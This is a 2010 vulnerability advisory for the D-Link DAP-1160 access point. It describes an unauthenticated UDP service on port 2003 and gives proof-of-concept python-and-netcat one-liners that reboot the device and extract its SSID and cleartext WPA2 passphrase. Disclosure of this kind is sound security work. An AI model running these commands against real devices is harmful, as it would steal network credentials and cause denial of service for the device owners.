IS-2010-004 - D-Link DAP-1160 Unauthenticated Remote Configuration



Advisory Information
--------------------
Published:
2010-06-28

Updated:
2010-06-28

Manufacturer: D-Link
Model: DAP-1160
Firmware version: 1.20b06
          1.30b10
          1.31b01



Vulnerability Details
---------------------

Public References:
Not Assigned


Platform:
Successfully tested on D-Link DAP-1160 loaded with firmware versions:
v120b06, v130b10, v131b01.
Other models and/or firmware versions may be also affected.
Note: Only firmware version major numbers are displayed on the
administration web interface: 1.20, 1.30, 1.31


Background Information:
D-Link DAP-1160 is a wireless access points that allow wireless clients
connectivity to wired networks.
Supported 802.11b and 802.11g protocols. WEP, WPA and WPA2 supported.


Summary:
Unauthenticated access and modification of several device parameters,
including Wi-Fi SSID, keys and passphrases is possible.
Unauthenticated remote reboot of the device can be also performed.


Details:
DCCD is an UDP daemon that listens on port UDP 2003 of the device, that
is likely used for easy device configuration via the DCC (D-Link Click
'n Connect) protocol.
By sending properly formatted UDP datagrams to dccd daemon it is
possible to perform security relevant operation without any previous
authentication.
It is possible to remotely retrieve sensitive wireless configuration
parameters, such as Wi-Fi SSID, Encryption types, keys and passphrases,
along with other additional information.
It is also possible to remotely modify such parameters and configure the
device without any knowledge of the web administration password.
Remote reboot is another operation that an attacker may perform in an
unauthenticated way, possibly triggering a Denial-of-Service condition.


POC:
- Remote reboot
python -c 'print "\x05" + "\x00" * 7' | nc -u <IP_ADDR> 2003

- Retrieving Wi-Fi SSID
python -c 'print "\x03" + "\x00" * 7 + "\x21\x27\x00"' | nc -o ssid.txt
-u <IP_ADDR> 2003
cat ssid.txt (cleartext SSID displayed after "21 27 xx xx" in the
received datagram)

- Retrieving WPA2 PSK
python -c 'print "\x03" + "\x00" * 7 + "\x23\x27\x00\x00\x24\x27\x00"' |
nc -u -o pass.txt <IP_ADDR> 2003
cat pass.txt (cleartext WPA2 PSK displayed after "24 27 xx xx" in the
received datagram)


Impacts:
Remote extraction of sensitive information
Modification of existing device configuration
POssible Denial-of-Service


Solutions & Workaround:
Not available
